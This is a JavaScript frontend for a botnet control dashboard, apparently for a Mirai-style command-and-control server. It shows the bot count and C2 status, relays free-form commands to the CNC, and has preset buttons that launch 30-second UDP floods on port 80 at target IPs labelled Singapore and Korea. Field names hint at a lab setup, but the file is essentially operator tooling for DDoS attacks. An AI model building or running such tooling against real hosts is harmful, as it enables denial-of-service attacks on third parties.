/* Soft Command Deck — frontend */

const $ = (sel) => document.querySelector(sel);
const consoleEl = $("#console");
const botCountEl = $("#bot-count");
const heroSub = $("#hero-sub");
const distChips = $("#dist-chips");
const peerCount = $("#peer-count");
const pillCnc = $("#pill-cnc");
const pillBots = $("#pill-bots");

let localLogClear = false;
let lastBots = 0;

function toast(msg, kind = "good") {
  const wrap = $("#toasts");
  const el = document.createElement("div");
  el.className = `toast ${kind}`;
  el.textContent = msg;
  wrap.appendChild(el);
  setTimeout(() => el.remove(), 3200);
}

function pushConsole(line, cls = "") {
  if (!consoleEl) return;
  const div = document.createElement("div");
  div.className = `line ${cls}`;
  div.textContent = line;
  consoleEl.appendChild(div);
  consoleEl.scrollTop = consoleEl.scrollHeight;
  while (consoleEl.children.length > 250) {
    consoleEl.removeChild(consoleEl.firstChild);
  }
}

function renderLogs(logs = []) {
  if (localLogClear) return;
  consoleEl.innerHTML = "";
  logs.forEach((line) => {
    let cls = "";
    if (line.includes("[ERR]")) cls = "err";
    else if (line.includes("[OK]")) cls = "ok";
    else if (line.includes("[CMD]")) cls = "cmd";
    else if (line.includes("[CNC]")) cls = "cnc";
    pushConsole(line, cls);
  });
}

function setBots(n) {
  const v = Number(n) || 0;
  botCountEl.textContent = String(v);
  if (v !== lastBots) {
    botCountEl.classList.remove("pop");
    void botCountEl.offsetWidth;
    botCountEl.classList.add("pop");
    lastBots = v;
  }
  pillBots.classList.toggle("on", v > 0);
  pillBots.classList.toggle("warn", v === 0);
  $(".n-bot")?.classList.toggle("live", v > 0);
  $(".n-c2")?.classList.toggle("live", true);
}

function setCnc(up) {
  pillCnc.classList.toggle("on", !!up);
  pillCnc.classList.toggle("warn", !up);
}

function renderDist(dist = {}) {
  distChips.innerHTML = "";
  const keys = Object.keys(dist);
  if (!keys.length) {
    distChips.innerHTML = `<span class="chip">no source tags · total only</span>`;
    return;
  }
  keys.forEach((k) => {
    const chip = document.createElement("span");
    chip.className = "chip";
    chip.innerHTML = `${escapeHtml(k)} · <strong>${dist[k]}</strong>`;
    distChips.appendChild(chip);
  });
}

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

async function api(path, opts) {
  const res = await fetch(path, {
    headers: { "Content-Type": "application/json" },
    ...opts,
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok && !data.error) data.error = res.statusText;
  return data;
}

async function refreshStatus() {
  try {
    const data = await api("/api/status");
    setCnc(!!data.cnc_up);
    setBots(data.bot_total ?? 0);
    renderDist(data.distribution || {});
    peerCount.textContent =
      data.tcp_peers === undefined || data.tcp_peers < 0
        ? "—"
        : String(data.tcp_peers);

    if (data.lab) {
      $("#meta-c2").textContent = data.lab.c2 || "185.10.20.100";
      $("#meta-loader").textContent = data.lab.loader || "185.10.20.200";
      $("#ip-sg").textContent = data.lab.target_sg || "203.0.113.100";
      $("#ip-kr").textContent = data.lab.target_kr || "210.89.0.100";
    }

    if (data.cnc_up) {
      heroSub.textContent =
        (data.bot_total || 0) > 0
          ? "Fleet is online · CNC accepted bot handshake ✨"
          : "CNC is up · waiting for bots (try dvrHelper / mirai.dbg on bot nodes)";
    } else {
      heroSub.textContent =
        data.error || "CNC offline — start ./cnc on this machine first";
    }

    if (data.logs) renderLogs(data.logs);
    if (data.error && !data.ok) {
      /* quiet unless hard fail */
    }
  } catch (e) {
    setCnc(false);
    heroSub.textContent = "Dashboard API unreachable — is python app.py running?";
    pushConsole(`[ERR] ${e.message}`, "err");
  }
}

async function sendCommand(command) {
  if (!command) return;
  localLogClear = false;
  pushConsole(`[ui] sending: ${command}`, "cmd");
  try {
    const data = await api("/api/command", {
      method: "POST",
      body: JSON.stringify({ command }),
    });
    if (data.ok) {
      toast(`OK · ${command}`, "good");
      setBots(data.bot_total ?? lastBots);
      renderDist(data.distribution || {});
      if (data.response) {
        data.response.split("\n").forEach((line) => {
          if (line.trim()) pushConsole(line.trim(), "cnc");
        });
      }
    } else {
      toast(data.error || "Command failed", "bad");
      pushConsole(`[ERR] ${data.error || "failed"}`, "err");
    }
    if (data.logs) renderLogs(data.logs);
    await refreshStatus();
  } catch (e) {
    toast(e.message, "bad");
    pushConsole(`[ERR] ${e.message}`, "err");
  }
}

async function sendAttack(target) {
  localLogClear = false;
  pushConsole(`[ui] attack preset → ${target}`, "cmd");
  try {
    const data = await api("/api/attack", {
      method: "POST",
      body: JSON.stringify({ target, duration: 30, method: "udp", dport: 80 }),
    });
    if (data.ok) {
      toast(`Pulse sent · ${data.target_ip || target}`, "good");
      pushConsole(`[OK] ${data.command || target}`, "ok");
      $(".n-sg")?.classList.toggle("live", target === "sg");
      $(".n-kr")?.classList.toggle("live", target === "kr");
      setTimeout(() => {
        $(".n-sg")?.classList.remove("live");
        $(".n-kr")?.classList.remove("live");
      }, 8000);
    } else {
      toast(data.error || "Attack failed", "bad");
      pushConsole(`[ERR] ${data.error || "failed"}`, "err");
    }
    if (data.logs) renderLogs(data.logs);
    await refreshStatus();
  } catch (e) {
    toast(e.message, "bad");
  }
}

/* sparkle canvas */
function initSparkles() {
  const canvas = $("#sparkles");
  if (!canvas) return;
  const ctx = canvas.getContext("2d");
  let w, h, dots;

  function resize() {
    w = canvas.width = window.innerWidth;
    h = canvas.height = window.innerHeight;
    dots = Array.from({ length: 48 }, () => ({
      x: Math.random() * w,
      y: Math.random() * h,
      r: Math.random() * 1.8 + 0.4,
      a: Math.random() * 0.5 + 0.15,
      v: Math.random() * 0.25 + 0.05,
    }));
  }

  function frame() {
    ctx.clearRect(0, 0, w, h);
    for (const d of dots) {
      d.y -= d.v;
      if (d.y < -4) {
        d.y = h + 4;
        d.x = Math.random() * w;
      }
      ctx.beginPath();
      ctx.fillStyle = `rgba(255, 190, 230, ${d.a})`;
      ctx.arc(d.x, d.y, d.r, 0, Math.PI * 2);
      ctx.fill();
    }
    requestAnimationFrame(frame);
  }

  resize();
  window.addEventListener("resize", resize);
  frame();
}

function tickClock() {
  const el = $("#clock");
  if (!el) return;
  const t = new Date();
  el.textContent = t.toLocaleString();
}

function bind() {
  $("#btn-refresh")?.addEventListener("click", () => {
    refreshStatus();
    toast("Refreshed");
  });
  $("#btn-status")?.addEventListener("click", () => refreshStatus());
  $("#btn-send")?.addEventListener("click", () => {
    const v = $("#cmd-input").value.trim();
    sendCommand(v);
  });
  $("#cmd-input")?.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      sendCommand(e.target.value.trim());
    }
  });
  $("#btn-clear-log")?.addEventListener("click", () => {
    consoleEl.innerHTML = "";
    localLogClear = true;
    pushConsole("[ui] view cleared (server logs still collecting)", "cmd");
  });

  document.querySelectorAll("[data-cmd]").forEach((btn) => {
    btn.addEventListener("click", () => sendCommand(btn.getAttribute("data-cmd")));
  });
  document.querySelectorAll("[data-attack]").forEach((btn) => {
    btn.addEventListener("click", () => sendAttack(btn.getAttribute("data-attack")));
  });
}

bind();
initSparkles();
tickClock();
setInterval(tickClock, 1000);
refreshStatus();
setInterval(refreshStatus, 4000);
